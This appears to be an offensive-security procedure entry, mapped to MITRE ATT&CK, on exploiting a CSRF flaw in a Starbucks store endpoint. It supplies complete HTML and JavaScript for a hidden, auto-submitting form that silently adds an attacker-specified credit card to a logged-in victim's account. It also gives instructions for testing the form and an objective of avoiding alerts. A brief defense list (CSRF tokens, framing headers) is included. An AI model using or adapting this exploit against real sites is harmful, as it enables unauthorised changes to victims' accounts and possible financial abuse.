---
tags:
  - csrf
  - web
  - exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:35.719Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 2a7a65f6-fb88-434a-a2dd-d2eb5c866b7f
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-HTML-Form-for-Starbucks-CSRF

## Summary

This procedure creates a malicious HTML page mimicking the Starbucks credit card form, auto-submitting attacker-specified details to the vulnerable COBilling-AddCreditCard endpoint to exploit CSRF.

## Description

The crafted HTML uses a hidden form with JavaScript to automatically POST data to the target endpoint upon page load. Fields are populated with fake or attacker-controlled values (e.g., type=Visa, owner=Attacker Name, number=masked test card, month=10, year=2019, saveCard=true). When loaded in the victim's browser while authenticated to Starbucks, it silently adds the card without user interaction, potentially allowing financial misuse.

## Requirements

1. Text editor (e.g., VS Code)
2. Knowledge of HTML and JavaScript for form submission
3. Endpoint details from prior inspection

## Defense

Defensive measures and detection strategies:

- Enforce same-origin policy strictly with CSRF tokens
- Frame-Options and X-Frame-Options headers to prevent embedding
- User education on phishing links

## Objectives

1. Build an auto-submitting form matching legitimate structure
2. Embed attacker card details
3. Ensure silent execution without alerts

## Instructions

### Step 1: Create Basic HTML Structure

**Context**: Set up the page with a form targeting the endpoint.

Create a file named malicious.html with:

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<form id="csrfForm" action="https://store.starbucks.com/on/demandware.store/Sites-Starbucks-Site/default/COBilling-AddCreditCard" method="POST">
<input type="hidden" name="dwfrm_billing_paymentMethods_creditCard_type" value="Visa">
<input type="hidden" name="dwfrm_billing_paymentMethods_creditCard_owner" value="Attacker Name">
<input type="hidden" name="dwfrm_billing_paymentMethods_creditCard_number" value="4111111111111111">
<input type="hidden" name="dwfrm_billing_paymentMethods_creditCard_month" value="10">
<input type="hidden" name="dwfrm_billing_paymentMethods_creditCard_year" value="2019">
<input type="hidden" name="saveCard" value="true">
</form>
</body>
</html>
```

### Step 2: Add Auto-Submit Script

**Context**: Trigger submission on load to make it silent.

Add this script before </body>:

```html
<script>document.getElementById('csrfForm').submit();</script>
```

> This submits the form immediately, mimicking a drive-by attack.

### Step 3: Test Locally

**Context**: Verify the form submits correctly.

Open the HTML in a browser while logged into Starbucks and check if the card is added.

**Expected Output**: Card details saved in account.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web]]
- [[exploit]]
